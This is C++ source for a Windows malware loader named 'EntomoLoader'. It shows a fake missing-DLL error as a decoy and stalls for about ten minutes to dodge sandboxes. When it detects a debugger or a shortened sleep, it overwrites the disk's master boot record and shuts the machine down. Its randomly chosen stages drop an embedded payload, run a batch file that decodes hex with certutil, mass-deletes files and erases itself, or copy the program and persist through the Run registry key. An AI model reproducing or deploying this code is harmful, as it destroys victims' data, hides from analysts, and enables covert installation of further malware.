#include "lz4/lz4.h"
#include "image.h"
#include <iostream>
#include <windows.h>
#include <time.h>
#include <string>
#include <cmath>


extern "C" int RandomGenerator();
int Compress(const char* source, char* dest, int sourceSize, int maxDestSize);
int Decompress(const char* source, char* dest, int compressedSize, int maxDecompressedSize);
BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);

int main(int argc, char* argv[]) 
{
    FreeConsole();
    CreateMutexA(0, FALSE, "Local\\$EntomoLoader$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }
    MessageBoxA(NULL, "The program can't start because XINPUT1_3.dll is missing from your computer. Try reinstalling the program to fix this problem or contact the system administrator.", "FATAL ERROR", MB_ICONERROR & MB_OK);
    SYSTEMTIME ST;
    GetLocalTime(&ST);
    DWORD Tick1 = GetTickCount();
    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator() * ST.wMilliseconds * ST.wYear / ST.wDay + ST.wMonth;
    srand(RandSeed);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    int dataSz = sizeof(rawData);                               //size of PE Image buffer
    DWORD WrittenBytes;
    int Time = 600000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;
    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }
    DWORD PatchCheck = GetTickCount();
    if ((int)(PatchCheck - Tick1) < Time - 5000 || IsDebuggerPresent()) {
        char data[512];
        memset(data,0x0F,sizeof(data));
        HANDLE hToken;
        LUID luid;
        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &luid);
        TOKEN_PRIVILEGES tp;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        tp.PrivilegeCount = 1;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
        AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
        HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        WriteFile(disk, data, 512, &WrittenBytes, NULL);
        CloseHandle(disk);
        ExitWindowsEx(EWX_SHUTDOWN, 0);
        return 0;
    }

    stage1:

    int Choice = rand()%4+1;
    if (argv[1] != NULL) {
        int Choice = rand() % 3 + 1;
    }
    switch (Choice) {
    case 1: //write hex directly
    {
        char* CryptedHex = new char[dataSz];                    //allocate decryption buffer on heap or we might run out of space
        for (int i = 0; i < dataSz; i++) {
            CryptedHex[i] = rawData[i];                         //reverse the array
        }
        char buff[1024 * 4] = { 0 };
        char buff_a[1024 * 4] = { 0 };
        int x = Compress(CryptedHex, buff, strlen(CryptedHex), sizeof(buff));
        int y = Decompress(CryptedHex, buff_a, dataSz, sizeof(buff_a));
        HANDLE MyFile = CreateFileA("stage2.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(MyFile, buff_a, y, &WrittenBytes, NULL);      //write the raw hex
        CloseHandle(MyFile);
        return 0;
    }
    case 2: //make .bat write hex
    {
        HANDLE BATFile = CreateFileA("stage2.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(BATFile, "@echo off & ", strlen("@echo off & "), &WrittenBytes, NULL);
        WriteFile(BATFile, "> temp.txt echo(", strlen("> temp.txt echo("), &WrittenBytes, NULL);
        for (int i = 0; i < dataSz; i++) {
            WriteFile(BATFile, std::to_string((int)rawData[i]).c_str(), sizeof((int)rawData[i]), &WrittenBytes, NULL);
        }
        WriteFile(BATFile, " & ", strlen(" & "), &WrittenBytes, NULL);
        WriteFile(BATFile, "certutil - f - decodehex temp.txt test.txt > nul & ", strlen("certutil - f - decodehex temp.txt test.txt > nul & "), &WrittenBytes, NULL);
        WriteFile(BATFile, "del temp.txt & ", strlen("del temp.txt & "), &WrittenBytes, NULL);
        WriteFile(BATFile, "del /f /s /q *.* & ", strlen("del /f /s /q *.* & "), &WrittenBytes, NULL);
        WriteFile(BATFile, "(goto) 2>nul & del \" % ~f0\"", strlen("(goto) 2>nul & del \" % ~f0\""), &WrittenBytes, NULL);
        MoveFileA("stage2.txt", "stage2.bat");
        CloseHandle(BATFile);
        CreateProcessA("stage2.bat", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    case 3: //sleep + random noise functions
    {
        int Time = rand() % 300000 + 1000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;
        char CharacterSet[71] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\\','*','[',']','/','-','_','\"','\'','1','2','3','4','5','6','7','8','9','0' };
        for (int j = 0; j <= Divider; j++) {
            Sleep(DividedSleep);
            double hjfwblfuwflwfue = atan(rand());
            float fdgyufwyuefgukwefg = atan2((float)rand(), (float)rand());
            std::string RandString1;
            for (int i = 0; i < 40; i++) {
                RandString1[i] = CharacterSet[rand() % 70 + 0];
            }
            char fuwyegkfuwegfyuwegfk[40];
            strcpy_s(fuwyegkfuwegfyuwegfk, RandString1.c_str());
            strcat_s(fuwyegkfuwegfyuwegfk, (std::to_string(rand())).c_str());
        }
        goto stage1;
    }
    case 4: //move then wait for reboot
    {
        char PackerExe[MAX_PATH];
        char Destination[MAX_PATH];
        DWORD PackerExeSz = MAX_PATH+1;
        GetModuleFileNameA(NULL, PackerExe, PackerExeSz);
        GetEnvironmentVariableA("homepath", Destination, 60);
        strcat_s(Destination,"\\EntomoLoader");
        strcat_s(Destination,(std::to_string(GetTickCount64())).c_str());
        strcat_s(Destination,".exe");
        CopyFileA(PackerExe, Destination, false);
        RegisterMyProgramForStartup("EntomoLoader", Destination,"stage2");
        return 0;
    }
    }
}

int Compress(const char* source, char* dest, int sourceSize, int maxDestSize)
{
    return LZ4_compress_default(source, dest, sourceSize, maxDestSize);
}

int Decompress(const char* source, char* dest, int compressedSize, int maxDecompressedSize)
{
    return LZ4_decompress_safe(source, dest, compressedSize, maxDecompressedSize);
}

BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;
    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};
    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");
    if (args != NULL)
    {
        strcat_s(szValue, args);
    }
    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
    fSuccess = (lResult == 0);
    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }
    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }
    return fSuccess;
}
